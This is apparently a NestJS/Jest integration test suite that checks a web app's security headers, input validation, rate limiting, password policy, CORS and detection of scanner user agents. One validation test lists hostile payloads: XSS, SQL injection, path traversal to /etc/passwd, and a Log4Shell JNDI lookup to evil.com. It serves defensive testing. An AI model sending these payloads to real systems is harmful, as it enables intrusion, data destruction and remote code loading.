import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../../src/app.module';

describe('Enterprise Security Integration Tests', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  describe('Security Headers', () => {
    it('should apply OWASP security headers', async () => {
      const response = await request(app.getHttpServer())
        .get('/health')
        .expect(200);

      // Check for essential security headers
      expect(response.headers['x-frame-options']).toBeDefined();
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-xss-protection']).toBeDefined();
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
      expect(response.headers['referrer-policy']).toBeDefined();
      expect(response.headers['permissions-policy']).toBeDefined();
    });

    it('should have strong Content Security Policy', async () => {
      const response = await request(app.getHttpServer())
        .get('/health')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("style-src 'self'");
    });
  });

  describe('Request Validation', () => {
    it('should reject requests with malicious content', async () => {
      const maliciousPayloads = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/exploit}',
      ];

      for (const payload of maliciousPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'test@example.com',
            password: 'ValidPassword123!',
          });

        // Should either reject with 400 or sanitize the input
        expect([400, 422].includes(response.status)).toBeTruthy();
      }
    });

    it('should validate Content-Type header', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .set('Content-Type', 'text/html') // Invalid content type
        .send('malicious content');

      expect(response.status).toBe(400);
    });

    it('should enforce request size limits', async () => {
      const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB

      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({ data: largePayload });

      expect(response.status).toBe(413); // Payload Too Large
    });
  });
  describe('Rate Limiting', () => {
    it('should apply rate limiting to auth endpoints', async () => {
      const requests: Promise<any>[] = [];
      
      // Make multiple rapid requests
      for (let i = 0; i < 20; i++) {
        requests.push(
          request(app.getHttpServer())
            .post('/auth/login')
            .send({
              username: 'testuser',
              password: 'wrongpassword',
            })
        );
      }

      const responses = await Promise.all(requests);
      
      // Should eventually hit rate limit
      const rateLimitedResponses = responses.filter((res: any) => res.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Authentication Security', () => {
    it('should enforce strong password policy', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'abc123',
        'qwerty',
        'test', // too short
      ];

      for (const password of weakPasswords) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: 'testuser' + Math.random(),
            email: 'test' + Math.random() + '@example.com',
            password: password,
          });

        expect([400, 422].includes(response.status)).toBeTruthy();
      }
    });

    it('should require strong password format', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          username: 'testuser' + Math.random(),
          email: 'test' + Math.random() + '@example.com',
          password: 'StrongPassword123!',
        });

      // Should succeed with strong password
      expect([200, 201].includes(response.status)).toBeTruthy();
    });
  });

  describe('Security Monitoring', () => {
    it('should log security events', async () => {
      // Make a suspicious request
      await request(app.getHttpServer())
        .get('/admin/users')
        .set('User-Agent', 'sqlmap/1.0')
        .expect(401); // Should be unauthorized

      // Check that security event was logged (this would require accessing logs)
      // In a real test, you'd check your logging system
    });

    it('should detect and block suspicious user agents', async () => {
      const suspiciousUserAgents = [
        'sqlmap/1.0',
        'Nikto/2.1.6',
        'Mozilla/5.0 sqlmap/1.0',
        'python-requests/2.0',
      ];

      for (const userAgent of suspiciousUserAgents) {
        const response = await request(app.getHttpServer())
          .get('/health')
          .set('User-Agent', userAgent);

        // Should either block or flag the request
        expect(response.status).toBe(200); // Health endpoint should work
        // But security event should be logged
      }
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types', async () => {
      // This would test file upload endpoints if they exist
      // For now, we'll skip this test
    });

    it('should scan uploads for malware', async () => {
      // This would test malware scanning if implemented
      // For now, we'll skip this test
    });
  });

  describe('CORS Configuration', () => {
    it('should apply proper CORS headers', async () => {
      const response = await request(app.getHttpServer())
        .options('/auth/login')
        .set('Origin', 'http://localhost:5173')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toBeDefined();
      expect(response.headers['access-control-allow-headers']).toBeDefined();
    });

    it('should reject requests from unauthorized origins', async () => {
      const response = await request(app.getHttpServer())
        .get('/auth/me')
        .set('Origin', 'https://malicious-site.com');

      // CORS should block this or not include CORS headers
      expect(
        !response.headers['access-control-allow-origin'] ||
        response.headers['access-control-allow-origin'] !== 'https://malicious-site.com'
      ).toBeTruthy();
    });
  });

  describe('Security Health Checks', () => {
    it('should provide security health status', async () => {
      const response = await request(app.getHttpServer())
        .get('/health/security')
        .expect(200);

      expect(response.body).toHaveProperty('status');
      expect(response.body).toHaveProperty('checks');
      expect(response.body.checks).toHaveProperty('owasp');
      expect(response.body.checks).toHaveProperty('csp');
      expect(response.body.checks).toHaveProperty('monitoring');
    });
  });

  describe('Data Privacy & Compliance', () => {
    it('should handle PII data properly', async () => {
      // Test that sensitive data is properly encrypted/masked
      // This would require actual user data handling tests
    });

    it('should comply with GDPR requirements', async () => {
      // Test data retention, deletion, and access rights
      // This would require implementing GDPR compliance endpoints
    });
  });
});
